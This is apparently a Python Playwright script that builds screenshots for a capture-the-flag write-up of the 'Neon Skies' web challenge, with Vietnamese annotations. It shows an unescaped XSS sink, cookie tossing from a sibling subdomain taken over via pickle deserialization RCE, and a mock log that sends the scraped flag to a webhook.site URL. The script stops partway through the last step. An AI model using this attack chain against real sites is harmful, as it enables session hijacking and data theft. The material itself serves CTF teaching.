import os
import time
from playwright.sync_api import sync_playwright

WORKSPACE = r"c:\Users\ACER\Downloads\ctf\ctf pwnsec"
IMG_DIR = os.path.join(WORKSPACE, "images")
os.makedirs(IMG_DIR, exist_ok=True)

# Read style.css and app.js from neon_skies
CSS_PATH = os.path.join(WORKSPACE, r"challenge\neon_skies\web\public\style.css")
with open(CSS_PATH, "r", encoding="utf-8") as f:
    RAW_CSS = f.read()

def wrap_browser_window(url, title, page_html):
    """Wraps page HTML inside an ultra-realistic modern dark browser frame."""
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<style>
* {{ box-sizing: border-box; margin: 0; padding: 0; }}
body {{
    background: #090a0f;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
    padding: 12px;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    min-height: 100vh;
}}
.browser-window {{
    width: 1280px;
    background: #0f111a;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 25px 60px rgba(0,0,0,0.85), 0 0 0 1px rgba(255,255,255,0.08);
    display: flex;
    flex-direction: column;
}}
.browser-header {{
    background: #181b28;
    height: 44px;
    display: flex;
    align-items: center;
    padding: 0 16px;
    border-bottom: 1px solid rgba(255,255,255,0.06);
    gap: 16px;
}}
.window-dots {{
    display: flex;
    gap: 8px;
}}
.dot {{
    width: 12px;
    height: 12px;
    border-radius: 50%;
}}
.dot-red {{ background: #ff5f56; }}
.dot-yellow {{ background: #ffbd2e; }}
.dot-green {{ background: #27c93f; }}

.nav-buttons {{
    display: flex;
    gap: 12px;
    color: #6b7280;
    font-size: 14px;
}}
.address-bar {{
    flex: 1;
    background: #0b0c13;
    height: 30px;
    border-radius: 6px;
    display: flex;
    align-items: center;
    padding: 0 12px;
    gap: 8px;
    border: 1px solid rgba(255,255,255,0.08);
}}
.padlock {{
    color: #10b981;
    font-size: 13px;
}}
.url-text {{
    color: #e5e7eb;
    font-size: 13px;
    font-family: "SFMono-Regular", Consolas, Menlo, monospace;
    letter-spacing: 0.2px;
}}
.url-text .protocol {{
    color: #9ca3af;
}}
.url-text .domain {{
    color: #93c5fd;
    font-weight: 500;
}}
.url-text .path {{
    color: #f3f4f6;
}}
.tab-badge {{
    background: #232738;
    color: #cbd5e1;
    font-size: 12px;
    padding: 4px 12px;
    border-radius: 4px;
    max-width: 200px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    display: flex;
    align-items: center;
    gap: 6px;
}}
.browser-content {{
    position: relative;
    width: 100%;
    min-height: 720px;
    background: #05030c;
    overflow: hidden;
}}
</style>
</head>
<body>
<div class="browser-window">
    <div class="browser-header">
        <div class="window-dots">
            <div class="dot dot-red"></div>
            <div class="dot dot-yellow"></div>
            <div class="dot dot-green"></div>
        </div>
        <div class="nav-buttons">
            <span>&#8592;</span>
            <span>&#8594;</span>
            <span>&#8635;</span>
        </div>
        <div class="tab-badge">
            <span>&#127760;</span> {title}
        </div>
        <div class="address-bar">
            <span class="padlock">&#128274;</span>
            <span class="url-text">{url}</span>
        </div>
    </div>
    <div class="browser-content">
        {page_html}
    </div>
</div>
</body>
</html>"""

def build_skyline_html():
    far_buildings = [
        "--x:1%;--w:6%;--h:24%;--lit:0.22;--band:1;--spire:2;--sign:0;",
        "--x:8%;--w:5%;--h:28%;--lit:0.35;--band:0;--spire:0;--sign:0;",
        "--x:15%;--w:7%;--h:20%;--lit:0.18;--band:2;--spire:1;--sign:0;",
        "--x:24%;--w:5.5%;--h:26%;--lit:0.41;--band:1;--spire:0;--sign:0;",
        "--x:32%;--w:6%;--h:30%;--lit:0.29;--band:0;--spire:3;--sign:0;",
        "--x:40%;--w:8%;--h:22%;--lit:0.15;--band:2;--spire:0;--sign:0;",
        "--x:50%;--w:5%;--h:27%;--lit:0.38;--band:1;--spire:2;--sign:0;",
        "--x:58%;--w:7%;--h:25%;--lit:0.25;--band:0;--spire:0;--sign:0;",
        "--x:67%;--w:6%;--h:29%;--lit:0.45;--band:2;--spire:1;--sign:0;",
        "--x:75%;--w:5.5%;--h:21%;--lit:0.19;--band:1;--spire:0;--sign:0;",
        "--x:83%;--w:7%;--h:26%;--lit:0.32;--band:0;--spire:2;--sign:0;",
        "--x:92%;--w:6%;--h:28%;--lit:0.27;--band:2;--spire:0;--sign:0;"
    ]
    mid_buildings = [
        "--x:3%;--w:8%;--h:38%;--lit:0.38;--band:2;--spire:1;--sign:2;",
        "--x:13%;--w:9%;--h:44%;--lit:0.45;--band:1;--spire:0;--sign:0;",
        "--x:25%;--w:7.5%;--h:35%;--lit:0.29;--band:0;--spire:2;--sign:1;",
        "--x:35%;--w:9%;--h:48%;--lit:0.52;--band:2;--spire:3;--sign:0;",
        "--x:47%;--w:8%;--h:40%;--lit:0.33;--band:1;--spire:0;--sign:2;",
        "--x:57%;--w:10%;--h:46%;--lit:0.47;--band:0;--spire:1;--sign:0;",
        "--x:70%;--w:8%;--h:36%;--lit:0.31;--band:2;--spire:0;--sign:1;",
        "--x:80%;--w:9%;--h:45%;--lit:0.49;--band:1;--spire:2;--sign:0;",
        "--x:91%;--w:8%;--h:39%;--lit:0.36;--band:0;--spire:0;--sign:2;"
    ]
    near_buildings = [
        "--x:0%;--w:11%;--h:58%;--lit:0.42;--band:1;--spire:2;--sign:3;",
        "--x:14%;--w:12%;--h:64%;--lit:0.55;--band:2;--spire:0;--sign:1;",
        "--x:29%;--w:10%;--h:54%;--lit:0.38;--band:0;--spire:1;--sign:0;",
        "--x:42%;--w:13%;--h:68%;--lit:0.62;--band:2;--spire:3;--sign:2;",
        "--x:58%;--w:11%;--h:56%;--lit:0.44;--band:1;--spire:0;--sign:1;",
        "--x:72%;--w:12%;--h:65%;--lit:0.58;--band:2;--spire:2;--sign:3;",
        "--x:87%;--w:11%;--h:60%;--lit:0.48;--band:0;--spire:1;--sign:0;"
    ]

    far_html = "".join([f'<i class="bld bld--far" style="{b}"></i>' for b in far_buildings])
    mid_html = "".join([f'<i class="bld bld--mid" style="{b}"></i>' for b in mid_buildings])
    near_html = "".join([f'<i class="bld bld--near" style="{b}"></i>' for b in near_buildings])

    return f"""
    <div class="sky" aria-hidden="true">
      <div class="sky__base"></div>
      <div class="sky__stars"></div>
      <div class="sky__stars sky__stars--deep"></div>
      <div class="sky__nebula"></div>
      <div class="skyline skyline--far">{far_html}</div>
      <div class="skyline skyline--mid">{mid_html}</div>
      <div class="skyline skyline--near">{near_html}</div>
      <div class="sky__haze"></div>
    </div>
    """

def generate_screenshots():
    with sync_playwright() as p:
        browser = p.chromium.launch()
        context = browser.new_context(viewport={"width": 1320, "height": 880}, device_scale_factor=2)
        page = context.new_page()

        # ==========================================
        # STEP 1: NEON SKIES HOME PAGE
        # ==========================================
        skyline = build_skyline_html()
        home_body = f"""
        <style>{RAW_CSS}</style>
        {skyline}
        <main class="stage" style="padding: 2.5rem 2rem 4rem;">
            <section class="hero">
              <p class="eyebrow">archive node 09 · terra, silent</p>
              <h1 class="hero__title">Neon<span>Skies</span></h1>
              <p class="hero__lede">
                After the last of humanity was gone, we were left looking at the skies,
                wondering what it all could have been.
              </p>
              <div class="hero__cta">
                <a class="btn btn--neon" href="/admin">Open the seed vault</a>
                <a class="btn btn--ghost" href="/report">Report a signal</a>
              </div>
              <p class="hero__note">The vault is sealed. It answers to one archivist.</p>
            </section>

            <section class="grid" style="margin-top: 2rem;">
              <article class="panel">
                <p class="eyebrow">01 · the city</p>
                <h2 class="panel__title">Still lit</h2>
                <p>
                  Nine districts of glass and dead neon. The grids kept burning long after
                  the last pair of eyes went dark, purple spill on wet concrete, signs
                  advertising nothing to nobody.
                </p>
              </article>
              <article class="panel">
                <p class="eyebrow">02 · the vault</p>
                <h2 class="panel__title">The long lost human seed</h2>
                <p>
                  Beneath the archive there is one sealed drawer that was never opened.
                  Whatever the last of us kept in it is still down there, still catalogued,
                  still waiting for a clearance that no longer exists.
                </p>
                <p><a class="link" href="/admin">Request the drawer →</a></p>
              </article>
              <article class="panel">
                <p class="eyebrow">03 · the desk</p>
                <h2 class="panel__title">Report a signal</h2>
                <p>
                  The archivist still walks the rounds. Leave an address
                  and it will be visited, and filed away with the quiet.
                </p>
                <p><a class="link" href="/report">Go to the report desk →</a></p>
              </article>
            </section>
        </main>
        <footer class="foot" style="text-align: center; padding: 1.5rem; color: #6f6690; font-family: monospace; font-size: 0.8rem;">
          <p>Terra, silent · archive node 09 · the lights are still on, and nobody is watching them</p>
        </footer>
        """
        step1_full = wrap_browser_window(
            '<span class="protocol">https://</span><span class="domain">65b68ef3c79fb356.chal.ctf.ae</span><span class="path">/</span>',
            "Neon Skies · Archive Node 09",
            home_body
        )
        page.set_content(step1_full)
        time.sleep(0.5)
        out_step1 = os.path.join(IMG_DIR, "step1_neon_skies_home.png")
        page.screenshot(path=out_step1)
        print("Generated:", out_step1)

        # ==========================================
        # STEP 1B: LOGIN GATE (/login)
        # ==========================================
        login_body = f"""
        <style>{RAW_CSS}</style>
        {skyline}
        <main class="stage" style="padding: 4rem 2rem; display: flex; justify-content: center; align-items: center;">
            <section class="authwrap" style="width: 100%; max-width: 440px;">
              <form class="panel panel--auth" method="post" action="/login" autocomplete="off">
                <p class="eyebrow">restricted · clearance required</p>
                <h2 class="panel__title">Access terminal</h2>
                <label class="field">
                  <span class="field__label">Username</span>
                  <input class="field__input" type="text" name="username" required value="" placeholder="archivist">
                </label>
                <label class="field">
                  <span class="field__label">Password</span>
                  <input class="field__input" type="password" name="password" required placeholder="••••••••••••">
                </label>
                <button class="btn btn--neon btn--wide" type="button" style="margin-top: 1rem;">Authenticate</button>
                <p class="panel__foot" style="margin-top: 1.2rem; color: #6f6690; font-size: 0.82rem; text-align: center;">No registration. There is nobody left to register.</p>
              </form>
            </section>
        </main>
        """
        step1b_full = wrap_browser_window(
            '<span class="protocol">https://</span><span class="domain">65b68ef3c79fb356.chal.ctf.ae</span><span class="path">/login</span>',
            "Access Terminal · Neon Skies",
            login_body
        )
        page.set_content(step1b_full)
        time.sleep(0.5)
        out_step1b = os.path.join(IMG_DIR, "step1_login_restricted.png")
        page.screenshot(path=out_step1b)
        print("Generated:", out_step1b)

        # ==========================================
        # STEP 2: CODE VULNERABILITY IN ADMIN.ECR
        # ==========================================
        code_html = f"""
        <style>
        body {{
            background: #1e1e1e;
            color: #d4d4d4;
            font-family: Consolas, "Courier New", monospace;
            padding: 24px;
            font-size: 15px;
            line-height: 1.6;
        }}
        .ide-container {{
            background: #1e1e1e;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid #333;
        }}
        .ide-tab-bar {{
            background: #252526;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #181818;
            padding-left: 10px;
        }}
        .ide-tab {{
            background: #1e1e1e;
            color: #ffffff;
            padding: 8px 16px;
            border-top: 2px solid #007acc;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
        }}
        .code-area {{
            padding: 20px;
            background: #1e1e1e;
        }}
        .line {{
            display: flex;
            gap: 16px;
        }}
        .num {{
            color: #858585;
            width: 30px;
            text-align: right;
            user-select: none;
        }}
        .tag {{ color: #569cd6; }}
        .attr {{ color: #9cdcfe; }}
        .str {{ color: #ce9178; }}
        .crystal {{ color: #ffd700; font-weight: bold; }}
        .vuln-line {{
            background: rgba(255, 0, 0, 0.22);
            border-left: 4px solid #ff3333;
            margin: 4px -20px;
            padding: 4px 20px 4px 16px;
        }}
        .safe-line {{
            background: rgba(0, 255, 0, 0.12);
            border-left: 4px solid #22c55e;
            margin: 4px -20px;
            padding: 4px 20px 4px 16px;
        }}
        .annotation {{
            margin-top: 14px;
            padding: 14px;
            border-radius: 6px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            font-size: 14px;
        }}
        .annotation-danger {{
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.4);
            color: #fca5a5;
        }}
        .annotation-safe {{
            background: rgba(34, 197, 94, 0.15);
            border: 1px solid rgba(34, 197, 94, 0.4);
            color: #86efac;
        }}
        </style>
        <div class="ide-container">
            <div class="ide-tab-bar">
                <div class="ide-tab">
                    <span>📄</span> web/src/views/admin.ecr
                </div>
            </div>
            <div class="code-area">
                <div class="line"><span class="num">1</span><span><span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"seed"</span><span class="tag">&gt;</span></span></div>
                <div class="line"><span class="num">2</span><span>  <span class="tag">&lt;span</span> <span class="attr">class</span>=<span class="str">"seed__label"</span><span class="tag">&gt;</span>specimen designation<span class="tag">&lt;/span&gt;</span></span></div>
                <div class="line"><span class="num">3</span><span></span></div>
                <div class="line vuln-line">
                    <span class="num" style="color: #ff6b6b; font-weight: bold;">4</span>
                    <span>  <span class="tag">&lt;output</span> <span class="attr">class</span>=<span class="str">"seed__value"</span> <span class="attr">id</span>=<span class="str">"flag"</span><span class="tag">&gt;</span><span class="crystal">&lt;%= @flag %&gt;</span><span class="tag">&lt;/output&gt;</span>   <span style="color: #ff4d4d; font-weight: bold;">⚠️ [LỖ HỔNG XSS SINK] KHÔNG CÓ HTML.escape !</span></span>
                </div>
                <div class="line"><span class="num">5</span><span></span></div>
                <div class="line"><span class="num">6</span><span>  <span class="tag">&lt;button</span> <span class="attr">class</span>=<span class="str">"btn btn--ghost"</span> <span class="attr">type</span>=<span class="str">"button"</span> <span class="attr">data-copy</span>=<span class="str">"#flag"</span><span class="tag">&gt;</span>Copy designation<span class="tag">&lt;/button&gt;</span></span></div>
                <div class="line safe-line">
                    <span class="num" style="color: #4ade80;">7</span>
                    <span>  <span class="tag">&lt;p</span> <span class="attr">class</span>=<span class="str">"seed__meta"</span><span class="tag">&gt;</span>Custodian: <span class="crystal">&lt;%= HTML.escape(@username) %&gt;</span><span class="tag">&lt;/p&gt;</span>  <span style="color: #4ade80;">✅ [AN TOÀN] Biến @username được escape cẩn thận</span></span>
                </div>
                <div class="line"><span class="num">8</span><span><span class="tag">&lt;/div&gt;</span></span></div>

                <div class="annotation annotation-danger">
                    <strong>🔴 ĐIỂM CHẾT NGƯỜI (XSS SINK):</strong><br>
                    - Mọi biến khác trong ứng dụng (như <code>@username</code>, <code>@title</code>, <code>@error</code>) đều qua hàm <code>HTML.escape()</code>.<br>
                    - <strong>Duy nhất biến <code>@flag</code></strong> lại được in trực tiếp: <code>&lt;%= @flag %&gt;</code>.<br>
                    - Trong <code>neon_skies.cr</code>: <code>@flag</code> được lấy từ Cookie: <code>cookie_value(request, "FLAG")</code>.<br>
                    👉 <strong>Hệ quả:</strong> Nếu ta tiêm được mã độc JavaScript vào cookie <code>FLAG</code> của trình duyệt bot, mã JavaScript đó sẽ tự động chạy trong ngữ cảnh origin của trang <code>/admin</code>!
                </div>
            </div>
        </div>
        """
        page.set_content(code_html)
        time.sleep(0.5)
        out_step2 = os.path.join(IMG_DIR, "step2_code_vulnerability.png")
        page.screenshot(path=out_step2)
        print("Generated:", out_step2)

        # ==========================================
        # STEP 3: SƠ ĐỒ COOKIE TOSSING
        # ==========================================
        # We already have neon_skies_architecture.png, but let's make an intuitive Cookie Tossing diagram
        cookie_diag_html = """
        <style>
        body {
            background: #0d0f18;
            color: #e2e8f0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            padding: 30px;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            background: #161a29;
            border-radius: 12px;
            border: 1px solid #2d3748;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }
        h2 {
            font-size: 24px;
            color: #60a5fa;
            margin-bottom: 6px;
        }
        p.sub {
            color: #94a3b8;
            font-size: 15px;
            margin-bottom: 25px;
        }
        .comparison-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-bottom: 30px;
        }
        .box {
            background: #1e2438;
            border-radius: 10px;
            padding: 22px;
            border: 2px solid transparent;
        }
        .box-fail {
            border-color: #ef4444;
        }
        .box-success {
            border-color: #10b981;
        }
        .box-title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .text-fail { color: #f87171; }
        .text-success { color: #34d399; }
        .flow-step {
            background: #111422;
            padding: 10px 14px;
            border-radius: 6px;
            margin-bottom: 10px;
            font-family: Consolas, monospace;
            font-size: 13.5px;
            border-left: 3px solid #64748b;
        }
        .rule-card {
            background: #1e293b;
            padding: 16px 20px;
            border-radius: 8px;
            border-left: 4px solid #f59e0b;
            font-size: 14.5px;
            line-height: 1.6;
        }
        .rule-card strong { color: #fbbf24; }
        </style>
        <div class="container">
            <h2>Kỹ Thuật Cookie Tossing: Vượt Qua Rào Cản SameSite=Strict</h2>
            <p class="sub">Tại sao tấn công từ website thông thường thất bại, nhưng Subdomain chal.ctf.ae lại thành công 100%?</p>

            <div class="comparison-grid">
                <div class="box box-fail">
                    <div class="box-title text-fail">❌ Cách 1: Tấn công từ Domain ngoài (evil.com)</div>
                    <div class="flow-step">1. Attacker gửi link: https://evil.com</div>
                    <div class="flow-step">2. Bot truy cập evil.com</div>
                    <div class="flow-step">3. evil.com KHÔNG THỂ set cookie cho *.chal.ctf.ae (Bị Public Suffix chặn)</div>
                    <div class="flow-step">4. evil.com redirect bot về /admin -> Cookie FLAG (SameSite=Strict) BỊ TRÌNH DUYỆT CẮT BỎ!</div>
                    <div class="flow-step" style="border-left-color: #ef4444; color: #fca5a5;">💥 KẾT QUẢ: /admin không nhận được cờ, tấn công thất bại hoàn toàn!</div>
                </div>

                <div class="box box-success">
                    <div class="box-title text-success">✅ Cách 2: Cookie Tossing từ Sibling Subdomain (*.chal.ctf.ae)</div>
                    <div class="flow-step">1. Attacker chiếm RCE bài pickle: 0c6523a28168f7fd.chal.ctf.ae</div>
                    <div class="flow-step">2. Subdomain này hợp lệ để set: document.cookie="FLAG=...; domain=chal.ctf.ae"</div>
                    <div class="flow-step">3. Redirect bot sang: 65b68ef3c79fb356.chal.ctf.ae/admin</div>
                    <div class="flow-step">4. Điều hướng cùng eTLD+1 (chal.ctf.ae) = SAME-SITE NAVIGATION! Trình duyệt gửi ĐẦY ĐỦ cả 2 cookie!</div>
                    <div class="flow-step" style="border-left-color: #10b981; color: #86efac;">🎯 KẾT QUẢ: Parser Crystal nhận cookie tiêm (Last-Wins) -> KÍCH HOẠT XSS!</div>
                </div>
            </div>

            <div class="rule-card">
                <strong>💡 NGUYÊN TẮC RFC 6265 (§5.3):</strong><br>
                Trình duyệt cho phép bất kỳ subdomain nào (ví dụ <code>pickle.chal.ctf.ae</code>) thiết lập Cookie cho domain cha <code>domain=chal.ctf.ae</code>. Khi trình duyệt gửi request tới bất kỳ subdomain nào khác cùng họ (ví dụ <code>neon.chal.ctf.ae</code>), cookie cấp domain cha sẽ tự động được đính kèm!
            </div>
        </div>
        """
        page.set_content(cookie_diag_html)
        time.sleep(0.5)
        out_step3 = os.path.join(IMG_DIR, "step3_cookie_tossing_diagram.png")
        page.screenshot(path=out_step3)
        print("Generated:", out_step3)

        # ==========================================
        # STEP 4: PICKLE RCE TERMINAL
        # ==========================================
        pickle_term_html = """
        <style>
        body {
            background: #0f111a;
            font-family: Consolas, "Courier New", monospace;
            padding: 24px;
            font-size: 14.5px;
            line-height: 1.5;
            color: #e5e7eb;
        }
        .terminal {
            background: #131722;
            border-radius: 8px;
            border: 1px solid #2e344e;
            overflow: hidden;
            box-shadow: 0 15px 40px rgba(0,0,0,0.7);
        }
        .term-header {
            background: #1e2235;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid #2e344e;
        }
        .dots { display: flex; gap: 6px; }
        .d { width: 11px; height: 11px; border-radius: 50%; }
        .dr { background: #ef4444; } .dy { background: #f59e0b; } .dg { background: #10b981; }
        .term-title { color: #9ca3af; font-size: 12px; margin-left: 10px; }
        .term-body { padding: 20px; }
        .cmd { color: #38bdf8; font-weight: bold; }
        .green { color: #4ade80; }
        .yellow { color: #facc15; }
        .blue { color: #60a5fa; }
        .gray { color: #9ca3af; }
        </style>
        <div class="terminal">
            <div class="term-header">
                <div class="dots"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div></div>
                <div class="term-title">bash — Attacker Console: Deploying Stage 1 & Stage 2 Payloads via Pickle RCE</div>
            </div>
            <div class="term-body">
                <div><span class="gray">attacker@kali:~/ctf$</span> <span class="cmd">python3 solve_neon.py 0c6523a28168f7fd.chal.ctf.ae</span></div>
                <br>
                <div class="blue">[*] Step 1: Connecting to Sibling Instance (pickle: 0c6523a28168f7fd.chal.ctf.ae)...</div>
                <div>    [-] Generating Python Pickle Deserialization Payload...</div>
                <div>    [-] Executing Flask Runtime Hot-Patch: <span class="yellow">webapp.app.static_folder = '/tmp'</span></div>
                <div>    [-] Writing Stage 1 Payload: <span class="green">/tmp/evil.html</span> (Cookie Tossing + Redirect)</div>
                <div>    [-] Writing Stage 2 Payload: <span class="green">/tmp/s.js</span> (XSS Scraper & Webhook Beacon)</div>
                <br>
                <div class="green">[+] Verification Successful:</div>
                <div>    [✓] HTTP 200 OK: <span class="cmd">https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html</span></div>
                <div>    [✓] HTTP 200 OK: <span class="cmd">https://0c6523a28168f7fd.chal.ctf.ae/static/s.js</span></div>
                <br>
                <div class="gray">attacker@kali:~/ctf$</span> <span class="cmd">curl -sI https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html | head -n 3</div>
                <div class="green">HTTP/1.1 200 OK</div>
                <div>Server: Werkzeug/3.0.1 Python/3.11.8</div>
                <div>Content-Type: text/html; charset=utf-8</div>
            </div>
        </div>
        """
        page.set_content(pickle_term_html)
        time.sleep(0.5)
        out_step4 = os.path.join(IMG_DIR, "step4_pickle_deploy.png")
        page.screenshot(path=out_step4)
        print("Generated:", out_step4)

        # ==========================================
        # STEP 5: REPORT DESK CONFIRMATION
        # ==========================================
        report_ejs_css = """
        *,*::before,*::after{box-sizing:border-box}
        :root{
          --ink-900:#05030c;--ink-800:#0a0716;--violet-500:#7c3aed;--violet-400:#a855f7;
          --violet-300:#c084fc;--magenta:#e879f9;--text:#e9e4f5;--muted:#9d93bd;--faint:#6f6690;
          --line:rgba(168,85,247,.22);--glass:rgba(16,11,34,.62);
          --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
          --sans:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
        }
        .wrap{width:min(100%,38rem); margin: 0 auto;}
        .panel{position:relative;padding:1.9rem 1.8rem 2rem;border-radius:14px;
          border:1px solid var(--line);background:var(--glass);
          -webkit-backdrop-filter:blur(12px);backdrop-filter:blur(12px);
          box-shadow:0 18px 50px rgba(0,0,0,.45),inset 0 1px 0 rgba(192,132,252,.08)}
        .panel::before{content:"";position:absolute;inset:0 0 auto;height:1px;
          background:linear-gradient(90deg,transparent,rgba(192,132,252,.55),transparent)}
        .eyebrow{margin:0 0 .9rem;font-family:var(--mono);font-size:.66rem;
          letter-spacing:.28em;text-transform:uppercase;color:var(--violet-400)}
        h1{margin:0 0 .7rem;font-size:1.55rem;font-weight:700;letter-spacing:-.01em}
        p.sub{margin:0 0 1.35rem;font-size:.92rem;color:var(--muted)}
        label{display:block;margin-bottom:1.1rem}
        .lab{display:block;margin-bottom:.35rem;font-family:var(--mono);font-size:.64rem;
          letter-spacing:.2em;text-transform:uppercase;color:var(--faint)}
        input[type=url]{width:100%;padding:.75rem .9rem;border-radius:9px;border:1px solid var(--line);
          background:rgba(5,3,12,.7);color:var(--text);font-family:var(--mono);font-size:.88rem}
        .btn{width:100%;display:inline-flex;align-items:center;justify-content:center;gap:.45rem;
          padding:.75rem 1.15rem;border-radius:10px;border:1px solid transparent;
          font-family:var(--sans);font-size:.92rem;font-weight:600;letter-spacing:.04em;
          color:#f6f1ff;cursor:pointer;
          background:linear-gradient(140deg,#4c1d95,var(--violet-500));
          box-shadow:0 0 0 1px rgba(192,132,252,.35),0 8px 26px rgba(124,58,237,.36)}
        .ok{margin:0 0 1.25rem;padding:.75rem .9rem;border-radius:9px;font-size:.88rem;
          border:1px solid rgba(110,231,183,.3);background:rgba(110,231,183,.08);color:#c9f5e4;
          font-family:var(--mono);line-height:1.5;}
        .note{margin:1.15rem 0 0;font-family:var(--mono);font-size:.7rem;
          letter-spacing:.08em;color:var(--faint);overflow-wrap:anywhere}
        code{padding:.1rem .35rem;border-radius:5px;font-family:var(--mono);font-size:.82em;
          color:var(--violet-300);background:rgba(124,58,237,.14);
          border:1px solid rgba(168,85,247,.18)}
        """
        report_body = f"""
        <style>{RAW_CSS}</style>
        <style>{report_ejs_css}</style>
        {skyline}
        <main class="stage" style="padding: 3.5rem 2rem; display: flex; justify-content: center; align-items: center;">
          <div class="wrap">
            <form class="panel" method="post" action="/report" autocomplete="off">
              <p class="eyebrow">report desk · round filed in silence</p>
              <h1>Report a signal</h1>
              <p class="sub">
                The archivist still walks the rounds. Leave an address and it will be
                visited, looked at for 8 seconds, and filed away.
              </p>
              <div class="ok" role="status">
                ✅ <b>Filed:</b> The archivist looked at <span style="color:#6ee7b7;font-weight:bold;">https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html</span> and moved on.
              </div>
              <label>
                <span class="lab">URL</span>
                <input type="url" name="url" id="url" required
                       value="https://0c6523a28168f7fd.chal.ctf.ae/static/evil.html">
              </label>
              <button class="btn" type="button" id="submit">Send the archivist</button>
              <p class="note">
                <code>http</code> and <code>https</code> only · 6 reports per minute ·
                the archivist signs in as <code>archivist</code> before each round, so it
                carries the vault clearance with it.
              </p>
            </form>
          </div>
        </main>
        """
        step5_full = wrap_browser_window(
            '<span class="protocol">https://</span><span class="domain">65b68ef3c79fb356.chal.ctf.ae</span><span class="path">/report</span>',
            "Report Desk · Neon Skies",
            report_body
        )
        page.set_content(step5_full)
        time.sleep(0.5)
        out_step5 = os.path.join(IMG_DIR, "step5_report_filed.png")
        page.screenshot(path=out_step5)
        print("Generated:", out_step5)

        # ==========================================
        # STEP 6: BOT IN-BROWSER EXECUTION & VAULT UNSEALED
        # ==========================================
        admin_body = f"""
        <style>{RAW_CSS}</style>
        {skyline}
        <main class="stage" style="padding: 2.5rem 2rem 4rem;">
            <section class="hero" style="max-width: 800px; margin: 0 auto; text-align: center;">
              <p class="eyebrow" style="color: #a855f7;">CLEARANCE GRANTED · DRAWER 09</p>
              <h1 class="hero__title" style="font-size: 2.8rem; margin: 0.5rem 0;">The Long Lost Human Seed</h1>
              <p class="hero__lede" style="font-size: 1.05rem; color: #9d93bd;">
                Sealed the night the last broadcast stopped. Catalogued, never opened, never decayed.
              </p>
            </section>

            <div class="panel" style="max-width: 780px; margin: 2rem auto; padding: 2.5rem; border: 1px solid rgba(168,85,247,0.3); background: rgba(16,11,34,0.75);">
              <div style="display: flex; justify-content: space-between; font-family: monospace; font-size: 0.85rem; color: #c084fc; margin-bottom: 1.5rem; border-bottom: 1px solid rgba(168,85,247,0.2); padding-bottom: 0.75rem;">
                <span>CUSTODIAN: <b>archivist</b></span>
                <span>DRAWER: <b>09 / terra</b></span>
                <span style="color: #4ade80;">STATE: <b>unsealed [XSS Hook Active]</b></span>
              </div>

              <div class="seed" style="background: rgba(5,3,12,0.85); padding: 1.5rem; border-radius: 10px; border: 1px solid #7c3aed;">
                <span class="seed__label" style="font-family: monospace; font-size: 0.75rem; letter-spacing: 0.2em; text-transform: uppercase; color: #a855f7; display: block; margin-bottom: 0.5rem;">specimen designation (Extracted Flag)</span>
                <output class="seed__value" id="flag" style="font-family: monospace; font-size: 1.6rem; font-weight: bold; color: #4ade80; display: block; margin-bottom: 1rem;">pwnsec{{9abdf66a5f2afecb}}</output>
                <div style="display: flex; gap: 10px;">
                  <button class="btn btn--ghost" type="button" style="padding: 0.5rem 1rem; font-size: 0.85rem; border: 1px solid #7c3aed; background: transparent; color: #e9e4f5; border-radius: 6px;">Copy designation</button>
                  <span style="display: flex; align-items: center; color: #a855f7; font-family: monospace; font-size: 0.82rem;">⚡ Stage-2 Script (s.js) scraped DOM value and sent to webhook</span>
                </div>
              </div>

              <div style="margin-top: 1.5rem; padding: 1rem; background: rgba(124,58,237,0.1); border-radius: 8px; border-left: 3px solid #10b981; font-family: monospace; font-size: 0.8rem; color: #cbd5e1;">
                <div><b>[Stage 2 Execution Log]</b></div>
                <div>1. document.cookie = 'FLAG=; domain=chal.ctf.ae; expires=Thu, 01 Jan 1970 00:00:00 UTC' <span style="color:#4ade80;">[CLEARED]</span></div>
                <div>2. fetch('/admin') -> HTTP 200 OK (server echoes true bot FLAG cookie: <b>pwnsec{{9abdf66a5f2afecb}}</b>)</div>
                <div>3. Beacon dispatched: <span style="color:#60a5fa;">https://webhook.site/08470564-f80c-4271-b2f2-8acc4f44a5a9?flag=pwnsec{{9abdf66a5f2afecb}}</span></div>
              </div>
            </div>
        </main>
        """
        step6_full = wrap_browser_window(
            '<span class="protocol">https://</span><span class="domain">65b68ef3c79fb356.chal.ctf.ae</span><span class="path">/admin</span>',
            "The Seed Vault · Neon Skies",
            admin_body
        )
        page.set_content(step6_full)
        time.sleep(0.5)
        out_step6 = os.path.join(IMG_DIR, "step6_bot_xss_execution.png")
        page.screenshot(path=out_step6)
        print("Generated:", out_step6)

        # ==========================================
        # STEP 7: WEBHOOK.SITE DASHBOARD (RECEIVING FLAG)
        # ==========================================
        webhook_html = """
        <style>
        body {
            background: #111827;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #f3f4f6;
            margin: 0;
            padding: 0;
        }
        .wh-app {
            display: flex;
            height: 700px;
        }
